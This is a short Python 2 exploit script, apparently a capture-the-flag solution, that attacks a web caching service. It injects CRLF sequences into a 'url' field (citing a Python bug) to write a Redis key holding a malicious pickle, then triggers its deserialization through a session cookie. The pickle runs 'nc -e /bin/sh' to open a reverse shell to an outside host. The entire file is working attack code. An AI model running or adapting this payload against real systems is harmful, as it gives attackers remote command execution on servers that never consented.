import base64
import cPickle
import os

import requests

# https://bugs.python.org/issue30458
# praise orange


class Exploit(object):
    def __reduce__(self):
        return (os.system, ('nc -e /bin/sh plus.or.kr 46845',))

bad_session_id = 'very-evil-session-id'
bad_pickle = cPickle.dumps(Exploit())
bad_pickle_b64 = base64.b64encode(bad_pickle)


payload = {
    'url': 'http://127.0.0.1\r\n SET session:' + bad_session_id + ' ' + bad_pickle_b64 + '\r\n :6379/foo',
}

print requests.post('http://webcached.eatpwnnosleep.com/', data=payload).text

print requests.get('http://webcached.eatpwnnosleep.com/view', cookies={
    'session': bad_session_id
}).text
